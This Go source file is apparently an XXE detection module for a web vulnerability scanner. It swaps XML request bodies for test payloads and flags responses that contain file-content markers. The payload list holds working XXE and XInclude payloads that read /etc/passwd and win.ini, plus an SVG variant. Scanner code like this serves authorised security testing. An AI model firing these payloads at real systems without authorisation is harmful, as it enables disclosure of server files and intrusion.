package xxe_generic

import (
	"fmt"
	"strings"

	"github.com/pkg/errors"
	"github.com/vigolium/vigolium/pkg/core/hosterrors"
	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/output"
	"github.com/vigolium/vigolium/pkg/utils"
)

// xxePayload defines an XXE test case.
type xxePayload struct {
	payload string
	markers []string // expected strings in response if XXE succeeds
	desc    string
}

var payloads = []xxePayload{
	{
		payload: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
		markers: []string{"root:", "/bin/bash", "/bin/sh", "nobody:"},
		desc:    "Linux /etc/passwd via file:// entity",
	},
	{
		payload: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>`,
		markers: []string{"[fonts]", "[extensions]", "for 16-bit"},
		desc:    "Windows win.ini via file:// entity",
	},
	{
		payload: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe "vigolium-xxe-test-entity">]><root>&xxe;</root>`,
		markers: []string{"vigolium-xxe-test-entity"},
		desc:    "Internal entity expansion",
	},
	{
		payload: `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`,
		markers: []string{"root:", "/bin/bash", "/bin/sh", "nobody:"},
		desc:    "XInclude file:///etc/passwd",
	},
	{
		payload: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>`,
		markers: []string{"root:", "/bin/bash", "/bin/sh"},
		desc:    "SVG XXE via file:// entity",
	},
}

// Module implements the XXE Generic active scanner.
type Module struct {
	modkit.BaseActiveModule
	rhm dedup.Lazy[dedup.RequestHashManager]
}

// New creates a new XXE Generic module.
func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeRequest,
			modkit.AllInsertionPointTypes,
		),
		rhm: dedup.LazyDefaultRHM("xxe_generic"),
	}
	m.ModuleTags = ModuleTags
	return m
}

// CanProcess limits to requests that accept or send XML content.
func (m *Module) CanProcess(ctx *httpmsg.HttpRequestResponse) bool {
	if !m.BaseActiveModule.CanProcess(ctx) {
		return false
	}
	if ctx.Request() == nil {
		return false
	}

	ct := strings.ToLower(ctx.Request().Header("Content-Type"))
	// Process XML content types or requests without a specific content type
	if strings.Contains(ct, "xml") || strings.Contains(ct, "soap") {
		return true
	}

	// Also check Accept header
	accept := strings.ToLower(ctx.Request().Header("Accept"))
	if strings.Contains(accept, "xml") {
		return true
	}

	// Check if body contains XML-like content
	body := ctx.Request().BodyToString()
	if strings.HasPrefix(strings.TrimSpace(body), "<?xml") || strings.HasPrefix(strings.TrimSpace(body), "<") {
		return true
	}

	return false
}

// ScanPerRequest tests the request for XXE vulnerabilities.
func (m *Module) ScanPerRequest(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	urlx, err := ctx.URL()
	if err != nil {
		return nil, errors.Wrap(err, "failed to get URL")
	}

	if utils.IsMediaAndJSURL(urlx.Path) {
		return nil, nil
	}

	// Get original response body
	var origBody string
	if ctx.Response() != nil {
		origBody = ctx.Response().BodyToString()
	}

	var results []*output.ResultEvent

	for _, p := range payloads {
		// Replace body with XXE payload
		modifiedRaw, err := httpmsg.SetBody(ctx.Request().Raw(), []byte(p.payload))
		if err != nil {
			continue
		}

		// Ensure Content-Type is set to XML
		modifiedRaw, err = httpmsg.AddOrReplaceHeader(modifiedRaw, "Content-Type", "application/xml")
		if err != nil {
			continue
		}

		fuzzedReq, err := httpmsg.ParseRawRequest(string(modifiedRaw))
		if err != nil {
			continue
		}
		fuzzedReq = fuzzedReq.WithService(ctx.Service())

		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return results, nil
			}
			continue
		}

		body := resp.Body().String()
		if marker := checkXXEMarkers(body, origBody, p.markers); marker != "" {
			results = append(results, &output.ResultEvent{
				URL:              urlx.String(),
				Request:          string(modifiedRaw),
				Response:         resp.FullResponse().String(),
				ExtractedResults: []string{marker},
				Info: output.Info{
					Name:        fmt.Sprintf("XXE: %s", p.desc),
					Description: fmt.Sprintf("XXE entity expanded — marker %q found in response", marker),
				},
			})
			resp.Close()
			return results, nil
		}
		resp.Close()
	}

	return results, nil
}

// checkXXEMarkers checks if response body contains XXE success indicators not in original.
func checkXXEMarkers(body, origBody string, markers []string) string {
	for _, marker := range markers {
		if strings.Contains(body, marker) && !strings.Contains(origBody, marker) {
			return marker
		}
	}
	return ""
}
